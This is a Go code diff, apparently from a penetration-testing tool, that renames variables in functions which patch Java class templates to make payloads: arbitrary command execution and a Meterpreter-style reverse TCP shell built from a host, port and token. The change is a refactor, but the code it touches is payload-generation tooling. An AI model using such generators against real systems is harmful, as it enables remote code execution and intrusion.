@@ -11,10 +11,10 @@ import (
 // GenerateExecute is used to generate class file for execute command.
 func GenerateExecute(template []byte, command, class string) ([]byte, error) {
 	const (
-		fileNameFlag = "Execute.java"
-		commandFlag  = "${cmd}"
-		className    = "Execute\x01"
-		uint16Size   = 2
+		fileName    = "Execute.java"
+		commandFlag = "${cmd}"
+		className   = "Execute\x01"
+		uint16Size  = 2
 	)
 
 	err := checkJavaClass(template)
@@ -23,7 +23,7 @@ func GenerateExecute(template []byte, command, class string) ([]byte, error) {
 	}
 
 	// find three special strings
-	fileNameIdx := bytes.Index(template, []byte(fileNameFlag))
+	fileNameIdx := bytes.Index(template, []byte(fileName))
 	if fileNameIdx == -1 {
 		return nil, errors.New("failed to find file name in execute template")
 	}
@@ -49,13 +49,13 @@ func GenerateExecute(template []byte, command, class string) ([]byte, error) {
 
 	// change file name
 	output.Write(template[:fileNameIdx-uint16Size])
-	fileName := class + ".java"
-	size := beUint16ToBytes(uint16(len(fileName)))
+	newFileName := class + ".java"
+	size := beUint16ToBytes(uint16(len(newFileName)))
 	output.Write(size)
-	output.WriteString(fileName)
+	output.WriteString(newFileName)
 
 	// change command
-	output.Write(template[fileNameIdx+len(fileNameFlag) : commandIdx-uint16Size])
+	output.Write(template[fileNameIdx+len(fileName) : commandIdx-uint16Size])
 	size = beUint16ToBytes(uint16(len(command)))
 	output.Write(size)
 	output.WriteString(command)
@@ -73,7 +73,7 @@ func GenerateExecute(template []byte, command, class string) ([]byte, error) {
 // GenerateSystem is used to generate class file for execute command with arguments.
 func GenerateSystem(template []byte, binary, arguments, class string) ([]byte, error) {
 	const (
-		fileNameFlag = "System.java"
+		fileName     = "System.java"
 		binaryFlag   = "${bin}"
 		argumentFlag = "${args}"
 		className    = "System\x01"
@@ -86,7 +86,7 @@ func GenerateSystem(template []byte, binary, arguments, class string) ([]byte, e
 	}
 
 	// find three special strings
-	fileNameIdx := bytes.Index(template, []byte(fileNameFlag))
+	fileNameIdx := bytes.Index(template, []byte(fileName))
 	if fileNameIdx == -1 {
 		return nil, errors.New("failed to find file name in system template")
 	}
@@ -116,13 +116,13 @@ func GenerateSystem(template []byte, binary, arguments, class string) ([]byte, e
 
 	// change file name
 	output.Write(template[:fileNameIdx-uint16Size])
-	fileName := class + ".java"
-	size := beUint16ToBytes(uint16(len(fileName)))
+	newFileName := class + ".java"
+	size := beUint16ToBytes(uint16(len(newFileName)))
 	output.Write(size)
-	output.WriteString(fileName)
+	output.WriteString(newFileName)
 
 	// change binary
-	output.Write(template[fileNameIdx+len(fileNameFlag) : binaryIdx-uint16Size])
+	output.Write(template[fileNameIdx+len(fileName) : binaryIdx-uint16Size])
 	size = beUint16ToBytes(uint16(len(binary)))
 	output.Write(size)
 	output.WriteString(binary)
@@ -147,12 +147,12 @@ func GenerateSystem(template []byte, binary, arguments, class string) ([]byte, e
 // meterpreter: payload/java/meterpreter/reverse_tcp.
 func GenerateReverseTCP(template []byte, host string, port uint16, token, class string) ([]byte, error) {
 	const (
-		fileNameFlag = "ReverseTCP.java"
-		hostFlag     = "${host}"
-		portFlag     = "${port}"
-		tokenFlag    = "${token}"
-		className    = "ReverseTCP\x0C"
-		uint16Size   = 2
+		fileName   = "ReverseTCP.java"
+		hostFlag   = "${host}"
+		portFlag   = "${port}"
+		tokenFlag  = "${token}"
+		className  = "ReverseTCP\x0C"
+		uint16Size = 2
 	)
 
 	err := checkJavaClass(template)
@@ -161,7 +161,7 @@ func GenerateReverseTCP(template []byte, host string, port uint16, token, class 
 	}
 
 	// find three special strings
-	fileNameIdx := bytes.Index(template, []byte(fileNameFlag))
+	fileNameIdx := bytes.Index(template, []byte(fileName))
 	if fileNameIdx == -1 {
 		return nil, errors.New("failed to find file name in reverse_tcp template")
 	}
@@ -201,13 +201,13 @@ func GenerateReverseTCP(template []byte, host string, port uint16, token, class 
 
 	// change file name
 	output.Write(template[:fileNameIdx-uint16Size])
-	fileName := class + ".java"
-	size := beUint16ToBytes(uint16(len(fileName)))
+	newFileName := class + ".java"
+	size := beUint16ToBytes(uint16(len(newFileName)))
 	output.Write(size)
-	output.WriteString(fileName)
+	output.WriteString(newFileName)
 
 	// change host
-	output.Write(template[fileNameIdx+len(fileNameFlag) : hostIdx-uint16Size])
+	output.Write(template[fileNameIdx+len(fileName) : hostIdx-uint16Size])
 	size = beUint16ToBytes(uint16(len(host)))
 	output.Write(size)
 	output.WriteString(host)
